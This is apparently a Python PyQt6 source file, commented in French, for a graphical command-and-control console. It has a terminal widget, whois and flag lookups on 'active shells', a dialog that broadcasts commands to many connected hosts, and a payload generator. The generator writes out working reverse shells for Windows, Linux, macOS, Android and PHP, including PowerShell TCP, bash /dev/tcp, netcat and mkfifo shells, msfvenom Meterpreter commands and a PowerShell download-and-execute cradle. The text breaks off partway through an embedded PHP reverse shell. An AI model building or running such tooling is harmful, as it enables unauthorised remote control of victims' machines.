
from PyQt6.QtWidgets import QTextEdit, QApplication
from PyQt6.QtGui import QTextCursor, QTextCharFormat, QColor, QFont
from PyQt6.QtCore import Qt, pyqtSignal

class TerminalWidget(QTextEdit):
    command_entered = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setFont(QFont("Courier", 10))
        self.setStyleSheet("background-color: black; color: #AAAAAA;")
        self.setUndoRedoEnabled(False)
        self.setLineWrapMode(QTextEdit.LineWrapMode.NoWrap)
        self.command_start_pos = 0
        self.set_prompt()

    def set_prompt(self):
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        cursor.insertText("$hell > ", QTextCharFormat())
        self.command_start_pos = cursor.position()
        self.setTextCursor(cursor)

    def keyPressEvent(self, event):
        cursor = self.textCursor()
        if cursor.position() < self.command_start_pos and event.key() not in (Qt.Key.Key_Left, Qt.Key.Key_Right, Qt.Key.Key_Up, Qt.Key.Key_Down):
            cursor.setPosition(self.command_start_pos)
            self.setTextCursor(cursor)
        if event.key() in (Qt.Key.Key_Return, Qt.Key.Key_Enter):
            cursor.movePosition(QTextCursor.MoveOperation.End)
            cursor.setPosition(self.command_start_pos, QTextCursor.MoveMode.KeepAnchor)
            command = cursor.selectedText().strip()
            cursor.removeSelectedText()
            self.append("\n")
            self.set_prompt()
            self.command_entered.emit(command)
        else:
            super().keyPressEvent(event)

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.MouseButton.RightButton:
            cursor = self.textCursor()
            if cursor.position() < self.command_start_pos:
                cursor.setPosition(self.command_start_pos)
                self.setTextCursor(cursor)
            t = QApplication.clipboard().text()
            if t:
                self.insertPlainText(t)
            return
        super().mouseReleaseEvent(event)

    def contextMenuEvent(self, event):
        cursor = self.textCursor()
        if cursor.position() < self.command_start_pos:
            cursor.setPosition(self.command_start_pos)
            self.setTextCursor(cursor)
        clipboard = QApplication.clipboard().text()
        if clipboard:
            self.insertPlainText(clipboard)
        event.accept()

    def append_output(self, text):
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        cursor.select(QTextCursor.SelectionType.LineUnderCursor)
        line_text = cursor.selectedText()
        if line_text.startswith("$hell > "):
            cursor.removeSelectedText()
        self.apply_ansi(text, cursor)
        if not (text.endswith('\n') or text.endswith('\r')):
            cursor.insertText('\n')
        self.setTextCursor(cursor)
        self.set_prompt()

    def apply_ansi(self, s, cursor):
        default_format = QTextCharFormat()
        default_format.setForeground(QColor("#AAAAAA"))
        fmt = QTextCharFormat(default_format)
        i = 0
        while i < len(s):
            if s[i] == '\x1b' and i + 1 < len(s) and s[i+1] == '[':
                j = i + 2
                while j < len(s) and s[j] not in 'm':
                    j += 1
                if j < len(s) and s[j] == 'm':
                    params = s[i+2:j]
                    if params == '':
                        params = '0'
                    parts = [p for p in params.split(';') if p != '']
                    if not parts:
                        parts = ['0']
                    k = 0
                    while k < len(parts):
                        try:
                            n = int(parts[k])
                        except:
                            n = 0
                        if n == 0:
                            fmt = QTextCharFormat(default_format)
                        elif n == 1:
                            fmt.setFontWeight(QFont.Weight.Bold)
                        elif n == 3:
                            fmt.setFontItalic(True)
                        elif n == 4:
                            fmt.setFontUnderline(True)
                        elif 30 <= n <= 37:
                            colors = {
                                30:"#000000",31:"#AA0000",32:"#00AA00",33:"#AA5500",
                                34:"#0000AA",35:"#AA00AA",36:"#00AAAA",37:"#AAAAAA"
                            }
                            fmt.setForeground(QColor(colors.get(n,"#AAAAAA")))
                        elif n == 39:
                            fmt.setForeground(QColor("#AAAAAA"))
                        elif 90 <= n <= 97:
                            colors = {
                                90:"#555555",91:"#FF5555",92:"#55FF55",93:"#FFFF55",
                                94:"#5555FF",95:"#FF55FF",96:"#55FFFF",97:"#FFFFFF"
                            }
                            fmt.setForeground(QColor(colors.get(n,"#AAAAAA")))
                        elif 40 <= n <= 47:
                            bg = {
                                40:"#000000",41:"#AA0000",42:"#00AA00",43:"#AA5500",
                                44:"#0000AA",45:"#AA00AA",46:"#00AAAA",47:"#AAAAAA"
                            }
                            fmt.setBackground(QColor(bg.get(n,"#000000")))
                        elif 100 <= n <= 107:
                            bg = {
                                100:"#555555",101:"#FF5555",102:"#55FF55",103:"#FFFF55",
                                104:"#5555FF",105:"#FF55FF",106:"#55FFFF",107:"#FFFFFF"
                            }
                            fmt.setBackground(QColor(bg.get(n,"#000000")))
                        elif n == 38 or n == 48:
                            if k + 2 < len(parts) and parts[k+1] == '5':
                                idx = int(parts[k+2])
                                def xterm_to_hex(i):
                                    if i < 16:
                                        table = [
                                            "#000000","#800000","#008000","#808000","#000080","#800080","#008080","#c0c0c0",
                                            "#808080","#ff0000","#00ff00","#ffff00","#0000ff","#ff00ff","#00ffff","#ffffff"
                                        ]
                                        return table[i]
                                    if 16 <= i <= 231:
                                        i -= 16
                                        r = (i // 36) % 6
                                        g = (i // 6) % 6
                                        b = i % 6
                                        step = [0,95,135,175,215,255]
                                        return '#%02x%02x%02x' % (step[r],step[g],step[b])
                                    if 232 <= i <= 255:
                                        v = 8 + (i-232)*10
                                        return '#%02x%02x%02x' % (v,v,v)
                                    return "#000000"
                                hexc = xterm_to_hex(idx)
                                if n == 38:
                                    fmt.setForeground(QColor(hexc))
                                else:
                                    fmt.setBackground(QColor(hexc))
                                k += 2
                        k += 1
                    i = j + 1
                    continue
            ch = s[i]
            if ch == '\r':
                i += 1
                continue
            cursor.setCharFormat(fmt)
            cursor.insertText(ch)
            i += 1

    def clean_ansi_sequences(self, text):
        text = text.replace('\r','')
        return text

import sys
import socket
import threading
import json
import time
import re
import os
# import base64 # Supprimé - Utilisé uniquement pour le transfert de fichiers
from collections import deque, OrderedDict
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                            QTabWidget, QTextEdit, QLineEdit, QPushButton, QLabel,
                            QStatusBar, QMenu, QMessageBox, QSplitter, QFrame, QScrollBar,
                            QCheckBox, QDialog, QGridLayout, QDialogButtonBox, QTabBar,
                            QGroupBox, QListWidget, QListWidgetItem, QFileDialog,
                            # QProgressBar, # Supprimé - Utilisé uniquement pour le transfert de fichiers
                            QComboBox, QTreeWidget, QTreeWidgetItem, QDockWidget, QInputDialog,
                            QFormLayout, QSpinBox, QSizePolicy, QStackedWidget, QTextBrowser,
                            QTableWidget, QTableWidgetItem, QHeaderView)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject, QEvent, QSize, QPropertyAnimation, QEasingCurve, QAbstractAnimation, QVariantAnimation, QThread
from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QTextCursor, QAction, QPalette, QClipboard, QPainter, QPen, QSyntaxHighlighter, QTextDocument, QIcon, QPixmap
# --- Ajout de l'import pour pygame (début du fichier) ---
try:
    from pygame import mixer
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False
    print("pygame not found. MP3 alert will be disabled. Install it with 'pip install pygame'")
# --- Ajout de l'import pour le proxy (début du fichier) ---
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("PySocks not found. Proxy functionality will be disabled. Install it with 'pip install PySocks'")
# --- Ajout de l'import pour ipwhois (début du fichier) ---
try:
    from ipwhois import IPWhois
    IPWHOIS_AVAILABLE = True
except ImportError:
    IPWHOIS_AVAILABLE = False
    print("ipwhois not found. Whois functionality will be disabled. Install it with 'pip install ipwhois'")
# --- Ajout de l'import pour requests (début du fichier) ---
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("requests not found. Flag functionality will be disabled. Install it with 'pip install requests'")
# --- Fin de l'ajout ---
# --- Fenêtre pour afficher le payload généré ---
class PayloadDisplayWindow(QDialog):
    def __init__(self, payload_text, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Generated Payload")
        self.setGeometry(200, 200, 800, 600)
        layout = QVBoxLayout(self)
        # Zone de texte pour le payload
        self.payload_text_edit = QTextEdit()
        self.payload_text_edit.setPlainText(payload_text)
        self.payload_text_edit.setReadOnly(True)
        self.payload_text_edit.setFont(QFont("Consolas", 10))
        layout.addWidget(self.payload_text_edit)
        # Boutons
        button_layout = QHBoxLayout()
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.clicked.connect(self.copy_to_clipboard)
        button_layout.addWidget(self.copy_btn)
        self.close_btn = QPushButton("Close")
        self.close_btn.clicked.connect(self.accept)
        button_layout.addWidget(self.close_btn)
        layout.addLayout(button_layout)
    def copy_to_clipboard(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.payload_text_edit.toPlainText())
        QMessageBox.information(self, "Copied", "Payload copied to clipboard!")
# --- Fenêtre pour afficher le résultat du Whois individuel ---
class WhoisDisplayWindow(QDialog):
    def __init__(self, ip_address, whois_output, parent=None):
        super().__init__(parent)
        self.ip_address = ip_address
        self.setWindowTitle(f"Whois Result for {self.ip_address}")
        self.setGeometry(250, 250, 800, 600) # Ajuster la taille si nécessaire

        layout = QVBoxLayout(self)

        # Titre
        title_label = QLabel(f"Whois Information for IP: {self.ip_address}")
        title_label.setStyleSheet("font-weight: bold; font-size: 12px; color: #CCCCCC;")
        layout.addWidget(title_label)

        # Zone de texte pour le résultat
        self.whois_text_edit = QTextEdit()
        self.whois_text_edit.setReadOnly(True)
        # Utiliser une police monospace pour une meilleure lisibilité des données texte brut
        self.whois_text_edit.setFont(QFont("Consolas", 9))
        self.whois_text_edit.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #AAAAAA;
                border: 1px solid #3E3E40;
                border-radius: 2px;
            }
        """)
        layout.addWidget(self.whois_text_edit)

        # Appliquer la coloration après avoir défini le texte
        self.set_colored_output(whois_output)

        # Boutons
        button_layout = QHBoxLayout()
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.clicked.connect(self.copy_to_clipboard)
        button_layout.addWidget(self.copy_btn)

        self.close_btn = QPushButton("Close")
        self.close_btn.clicked.connect(self.accept) # accept() ferme le dialogue
        button_layout.addWidget(self.close_btn)

        layout.addLayout(button_layout)

    def set_colored_output(self, output):
        """Définit le texte avec la coloration syntaxique."""
        self.whois_text_edit.clear()
        cursor = self.whois_text_edit.textCursor()

        # Définir les formats de couleur
        default_format = QTextCharFormat()
        default_format.setForeground(QColor("#AAAAAA")) # Gris par défaut

        red_format = QTextCharFormat()
        red_format.setForeground(QColor("#FF9999")) # Rouge pâle

        green_format = QTextCharFormat()
        green_format.setForeground(QColor("#99FF99")) # Vert pâle

        # Expression régulière pour les lignes à colorer
        lines = output.split('\n')
        for line in lines:
            if line.startswith("Query:"):
                cursor.insertText(line + '\n', red_format)
            elif (line.startswith("ASN Country:") or
                  line.startswith("ASN CIDR:") or
                  "description" in line.lower() or
                  line.startswith("range:")): # Ajout de "range:"
                cursor.insertText(line + '\n', green_format)
            else:
                cursor.insertText(line + '\n', default_format) # Gris par défaut

    def copy_to_clipboard(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.whois_text_edit.toPlainText())
        # Optionnel : Afficher un message court à l'utilisateur
        self.close_btn.setText("Copied!") # Change temporairement le texte
        QTimer.singleShot(1000, lambda: self.close_btn.setText("Close")) # Revient à "Close" après 1s
# --- Fenêtre pour afficher les résultats du Whois en masse ---
class BulkWhoisDisplayWindow(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Whois Active Shells")
        self.setGeometry(300, 300, 1200, 700)
        self.setStyleSheet("""
            QDialog {
                background-color: #2D2D30;
                color: #CCCCCC;
            }
            QLabel {
                color: #CCCCCC;
                font-weight: bold;
                font-size: 14px;
                margin-bottom: 10px;
            }
            QPushButton {
                background-color: #5A5A5D;
                color: #FFFFFF;
                border: none;
                border-radius: 5px;
                padding: 6px 12px;
                font-weight: bold;
                font-size: 10px;
            }
            QPushButton:hover {
                background-color: #6A6A6D;
            }
            QPushButton:pressed {
                background-color: #4A4A4D;
                padding: 7px 11px 5px 13px;
            }
            QPushButton:disabled {
                background-color: #3A3A3D;
                color: #777777;
            }
            QTableWidget {
                background-color: #1E1E1E;
                alternate-background-color: #252526;
                color: #AAAAAA;
                border: 1px solid #3E3E40;
                gridline-color: #3E3E40;
                selection-background-color: #094771;
                selection-color: #FFFFFF;
            }
            QTableWidget::item {
                padding: 4px; /* Réduction de 20% du padding original (environ) */
            }
            QHeaderView::section {
                background-color: #333337;
                color: #CCCCCC;
                padding: 4px;
                border: 1px solid #3E3E40;
                font-weight: bold;
            }
        """)

        layout = QVBoxLayout(self)
        
        # Titre
        title_label = QLabel("Whois Results for All Active Shells")
        layout.addWidget(title_label)

        # Tableau pour les résultats
        self.results_table = QTableWidget(0, 7) # 7 colonnes (ajout du drapeau)
        self.results_table.setHorizontalHeaderLabels(["Flag", "IP", "Country", "Country Code", "ASN CIDR", "Description", "Registry"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch) # Étirer les colonnes
        self.results_table.verticalHeader().setVisible(False) # Cacher l'en-tête vertical
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers) # Rendre non éditable
        self.results_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows) # Sélection par ligne
        layout.addWidget(self.results_table)

        # Boutons
        button_layout = QHBoxLayout()
        self.copy_btn = QPushButton("Copy All to Clipboard")
        self.copy_btn.clicked.connect(self.copy_to_clipboard)
        button_layout.addWidget(self.copy_btn)

        self.close_btn = QPushButton("Close")
        self.close_btn.clicked.connect(self.accept)
        button_layout.addWidget(self.close_btn)
        
        layout.addLayout(button_layout)
        
        # Cache pour les drapeaux
        self.flag_cache = {}

    def add_result(self, ip, country, country_code, asn_cidr, description, registry):
        """Ajoute un résultat au tableau."""
        row_position = self.results_table.rowCount()
        self.results_table.insertRow(row_position)
        
        # Créer les items
        flag_item = QTableWidgetItem()
        ip_item = QTableWidgetItem(ip)
        country_item = QTableWidgetItem(country)
        country_code_item = QTableWidgetItem(country_code)
        asn_cidr_item = QTableWidgetItem(asn_cidr)
        description_item = QTableWidgetItem(description)
        registry_item = QTableWidgetItem(registry)
        
        # Alignement
        flag_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        ip_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        country_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        country_code_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        asn_cidr_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        description_item.setTextAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignVCenter)
        registry_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        
        # Obtenir l'icône du drapeau
        flag_icon = self.get_flag_icon(country_code)
        if flag_icon:
            flag_item.setIcon(flag_icon)
        
        # Ajouter les items à la ligne
        self.results_table.setItem(row_position, 0, flag_item)
        self.results_table.setItem(row_position, 1, ip_item)
        self.results_table.setItem(row_position, 2, country_item)
        self.results_table.setItem(row_position, 3, country_code_item)
        self.results_table.setItem(row_position, 4, asn_cidr_item)
        self.results_table.setItem(row_position, 5, description_item)
        self.results_table.setItem(row_position, 6, registry_item)
        
    def get_flag_icon(self, country_code):
        """Obtient l'icône du drapeau pour un code pays."""
        # S'assurer que le cache existe
        if not hasattr(self, 'flag_cache'):
            self.flag_cache = {}

        if country_code in self.flag_cache:
            return self.flag_cache[country_code]
            
        if not country_code or country_code == "N/A":
            return None
            
        try:
            if not REQUESTS_AVAILABLE:
                return None
            url = f"https://flagcdn.com/w20/{country_code.lower()}.png"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                pixmap = QPixmap()
                pixmap.loadFromData(response.content)
                if not pixmap.isNull():
                    icon = QIcon(pixmap)
                    self.flag_cache[country_code] = icon
                    return icon
        except Exception as e:
            print(f"Error loading flag for {country_code}: {e}")
        return None
        
    def copy_to_clipboard(self):
        """Copie tout le contenu du tableau dans le presse-papiers."""
        clipboard = QApplication.clipboard()
        text = ""
        # En-têtes
        headers = [self.results_table.horizontalHeaderItem(i).text() for i in range(self.results_table.columnCount())]
        text += "\t".join(headers) + "\n"
        # Lignes
        for row in range(self.results_table.rowCount()):
            row_data = []
            for column in range(self.results_table.columnCount()):
                item = self.results_table.item(row, column)
                if item is not None:
                    # Pour la colonne du drapeau, on peut inclure le code pays ou simplement une indication
                    if column == 0: # Colonne du drapeau
                        # On peut essayer d'obtenir le code pays à partir de la colonne suivante
                        cc_item = self.results_table.item(row, 3) # Colonne Country Code
                        if cc_item and cc_item.text() != "N/A":
                            row_data.append(f"[{cc_item.text()}]")
                        else:
                            row_data.append("[FLAG]")
                    else:
                        row_data.append(item.text())
                else:
                    row_data.append("")
            text += "\t".join(row_data) + "\n"
        clipboard.setText(text)
        QMessageBox.information(self, "Copied", "All results copied to clipboard!")

# --- Fenêtre pour le Broadcast Command avec liste de commandes par OS ---
class BroadcastCommandDialog(QDialog):
    def __init__(self, command_dict, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Broadcast Command")
        self.setGeometry(300, 300, 600, 500)
        self.command_dict = command_dict
        self.current_os = "Windows"  # OS par défaut
        layout = QVBoxLayout(self)
        # Sélection de l'OS
        os_layout = QHBoxLayout()
        os_layout.addWidget(QLabel("Select OS:"))
        self.os_combo = QComboBox()
        self.os_combo.addItems(list(self.command_dict.keys()))
        self.os_combo.setCurrentText(self.current_os)
        self.os_combo.currentTextChanged.connect(self.on_os_changed)
        os_layout.addWidget(self.os_combo)
        os_layout.addStretch()
        layout.addLayout(os_layout)
        # Liste des commandes prédéfinies
        self.command_list_widget = QListWidget()
        self.command_list_widget.itemDoubleClicked.connect(self.select_command)
        layout.addWidget(QLabel("Double-click a command to use it:"))
        layout.addWidget(self.command_list_widget)
        # Champ de texte pour la commande personnalisée
        layout.addWidget(QLabel("Or enter a custom command:"))
        self.command_input = QLineEdit()
        layout.addWidget(self.command_input)
        # Boutons
        button_layout = QHBoxLayout()
        self.ok_btn = QPushButton("OK")
        self.ok_btn.clicked.connect(self.accept)
        button_layout.addWidget(self.ok_btn)
        self.cancel_btn = QPushButton("Cancel")
        self.cancel_btn.clicked.connect(self.reject)
        button_layout.addWidget(self.cancel_btn)
        layout.addLayout(button_layout)
        self.populate_command_list()
    def on_os_changed(self, os_name):
        """Changer la liste de commandes selon l'OS sélectionné"""
        self.current_os = os_name
        self.populate_command_list()
    def populate_command_list(self):
        """Remplit la liste avec les commandes prédéfinies pour l'OS courant"""
        self.command_list_widget.clear()
        if self.current_os in self.command_dict:
            for display_name, command in self.command_dict[self.current_os]:
                item = QListWidgetItem(f"{display_name} ({command})")
                item.setData(Qt.ItemDataRole.UserRole, command)  # Stocker la commande réelle
                self.command_list_widget.addItem(item)
    def select_command(self, item):
        """Sélectionne une commande de la liste"""
        command = item.data(Qt.ItemDataRole.UserRole)
        self.command_input.setText(command)
    def get_command(self):
        """Retourne la commande sélectionnée ou saisie"""
        return self.command_input.text().strip()
# --- Fin des fenêtres ---
class CommandHighlighter(QSyntaxHighlighter):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []
        # Command highlighting
        command_format = QTextCharFormat()
        command_format.setForeground(QColor("#FF6B6B"))
        command_format.setFontWeight(QFont.Weight.Bold)
        self.highlighting_rules.append((r'\$hell > ', command_format))
        # Path highlighting
        path_format = QTextCharFormat()
        path_format.setForeground(QColor("#4ECDC4"))
        self.highlighting_rules.append((r'\/[^\s]*', path_format))
        # Option highlighting
        option_format = QTextCharFormat()
        option_format.setForeground(QColor("#F7DC6F"))
        self.highlighting_rules.append((r'-\w+', option_format))
        # Error highlighting
        error_format = QTextCharFormat()
        error_format.setForeground(QColor("#FF4757"))
        self.highlighting_rules.append((r'error|Error|ERROR|fail|Fail|FAIL', error_format))
        # Success highlighting
        success_format = QTextCharFormat()
        success_format.setForeground(QColor("#2ED573"))
        self.highlighting_rules.append((r'success|Success|SUCCESS|done|Done|DONE', success_format))
    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = re.compile(pattern)
            for match in expression.finditer(text):
                start, end = match.span()
                self.setFormat(start, end - start, format)

class PayloadGeneratorWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()
    def setup_ui(self):
        layout = QFormLayout(self)
        layout.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)
        layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        # Platform selection
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "Linux", "macOS", "Android", "PHP", "Python", "Bash"])
        self.platform_combo.currentTextChanged.connect(self.on_platform_changed)
        layout.addRow("Platform:", self.platform_combo)
        # Architecture
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["x86", "x64", "ARM", "ARM64"])
        layout.addRow("Architecture:", self.arch_combo)
        # Payload type
        self.type_combo = QComboBox()
        self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter", "Web Shell"])
        layout.addRow("Type:", self.type_combo)
        # Encoding
        self.encoding_combo = QComboBox()
        self.encoding_combo.addItems(["None", "Base64", "Hex", "URL", " powershell -enc"])
        layout.addRow("Encoding:", self.encoding_combo)
        # Extension
        self.extension_combo = QComboBox()
        self.extension_combo.addItems([".exe", ".dll", ".ps1", ".sh", ".py", ".php", ".pl", ".rb"])
        layout.addRow("Extension:", self.extension_combo)
        # Custom filename
        self.filename_input = QLineEdit()
        self.filename_input.setPlaceholderText("e.g., my_payload")
        layout.addRow("Filename:", self.filename_input)
        # Connection settings
        self.host_input = QLineEdit("127.0.0.1")
        layout.addRow("Host:", self.host_input)
        self.port_input = QLineEdit("4444")
        layout.addRow("Port:", self.port_input)
        # Additional options for specific payloads
        self.obfuscate_checkbox = QCheckBox("Obfuscate (if supported)")
        layout.addRow(self.obfuscate_checkbox)
        self.staged_checkbox = QCheckBox("Staged Payload (if supported)")
        layout.addRow(self.staged_checkbox)
        # Generate button
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        layout.addRow(self.generate_btn)
        # Output (simplified now that we have a popup)
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMaximumHeight(50)  # Just a small preview
        self.output_text.setPlaceholderText("Payload summary will appear here. Click 'Generate' then 'View Full Payload' to see details.")
        layout.addRow("Preview:", self.output_text)
        # View Full Payload button
        self.view_payload_btn = QPushButton("View Full Payload")
        self.view_payload_btn.clicked.connect(self.view_full_payload)
        self.view_payload_btn.setEnabled(False)
        layout.addRow(self.view_payload_btn)
        self.generated_payload = "" # Store the full payload text
    def on_platform_changed(self, platform):
        """Update available extensions and types based on platform"""
        # Reset lists
        self.extension_combo.clear()
        self.type_combo.clear()
        # Update based on platform
        if platform == "Windows":
            self.extension_combo.addItems([".exe", ".dll", ".ps1", ".bat", ".vbs"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter", "Web Shell", "PowerShell Empire"])
        elif platform == "Linux":
            self.extension_combo.addItems([".sh", ".py", ".pl", ".elf"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter"])
        elif platform == "macOS":
            self.extension_combo.addItems([".sh", ".py", ".macho"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter"])
        elif platform == "Android":
            self.extension_combo.addItems([".apk", ".sh"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter"])
        elif platform == "PHP":
            self.extension_combo.addItems([".php", ".phtml"])
            self.type_combo.addItems(["Reverse Shell", "Web Shell"])
        elif platform == "Python":
            self.extension_combo.addItems([".py", ".pyw"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell"])
        elif platform == "Bash":
            self.extension_combo.addItems([".sh"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell"])
        else:
            self.extension_combo.addItems([".exe", ".dll", ".ps1", ".sh", ".py", ".php"])
            self.type_combo.addItems(["Reverse Shell", "Bind Shell", "Meterpreter", "Web Shell"])
    def generate_payload(self):
        platform = self.platform_combo.currentText()
        arch = self.arch_combo.currentText()
        ptype = self.type_combo.currentText()
        encoding = self.encoding_combo.currentText()
        extension = self.extension_combo.currentText()
        filename = self.filename_input.text().strip()
        host = self.host_input.text()
        port = self.port_input.text()
        obfuscate = self.obfuscate_checkbox.isChecked()
        staged = self.staged_checkbox.isChecked()
        # Generate payload based on selections
        payload = self._generate_payload_code(platform, ptype, host, port, obfuscate, staged)
        # Apply encoding
        encoded_payload = self._apply_encoding(payload, encoding)
        # Apply extension and filename (for display/logic)
        final_filename = f"{filename if filename else 'payload'}{extension}"
        # Format output preview
        output_text = f"Generated: {final_filename}\n"
        output_text += f"Platform: {platform}, Type: {ptype}, Encoding: {encoding}\n"
        # Show first few lines of payload as preview
        payload_preview = encoded_payload.split('\n')[:3]
        output_text += f"Preview:\n" + "\n".join(payload_preview)
        if len(encoded_payload.split('\n')) > 3:
            output_text += "\n..."
        self.output_text.setPlainText(output_text)
        self.generated_payload = encoded_payload # Store full payload
        self.view_payload_btn.setEnabled(True) # Enable view button
    def _generate_payload_code(self, platform, ptype, host, port, obfuscate, staged):
        """Generate the actual payload code"""
        # This is a simplified version. In a real tool, you'd integrate with msfvenom or similar
        if platform == "Windows":
            if ptype == "Reverse Shell":
                return f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
            elif ptype == "Meterpreter":
                stage_type = "meterpreter" if not staged else "meterpreter_reverse_tcp"
                return f"msfvenom -p windows/{stage_type} LHOST={host} LPORT={port} -f exe > payload.exe"
            elif ptype == "PowerShell Empire":
                return f"powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{host}/launcher.ps1');\""
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e cmd.exe {host} {port}"
        elif platform == "Linux":
            if ptype == "Reverse Shell":
                return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
            elif ptype == "Meterpreter":
                arch_map = {"x86": "x86", "x64": "x64", "ARM": "armle", "ARM64": "aarch64"}
                msf_arch = arch_map.get(arch, "x64")
                return f"msfvenom -p linux/{msf_arch}/meterpreter_reverse_tcp LHOST={host} LPORT={port} -f elf > payload.elf"
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e /bin/sh {host} {port}"
        elif platform == "macOS":
            if ptype == "Reverse Shell":
                return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            elif ptype == "Meterpreter":
                return f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={host} LPORT={port} -f macho > payload.macho"
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e /bin/sh {host} {port}"
        elif platform == "Android":
            if ptype == "Reverse Shell":
                return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/system/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
            elif ptype == "Meterpreter":
                return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} R > payload.apk"
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc {host} {port} | sh"
        elif platform == "PHP":
            if ptype == "Reverse Shell":
                return f"""<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{host}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {{
	$pid = pcntl_fork();
	if ($pid == -1) {{
		printit("ERROR: Can't fork");
		exit(1);
	}}
	if ($pid) {{
		exit(0);  // Parent exits
	}}
	if (posix_setsid() == -1) {{
		printit("Error: Can't setsid()");
		exit(1);
	}}
	$daemon = 1;
}} else {{
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}
chdir("/");
umask(0);
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
	printit("$errstr ($errno)");
	exit(1);
}}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {{
	printit("ERROR: Can't spawn shell");
	exit(1);
}}
stream_set_blocking($pipes[0], 0);
stream_setBlocking($pipes[1], 0);
stream_setBlocking($pipes[2], 0);
stream_setBlocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {{
	if (feof($sock)) {{
		printit("ERROR: Shell connection terminated");
		break;
	}}
	if (feof($pipes[1])) {{
		printit("ERROR: Shell process terminated");
		break;
	}}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {{
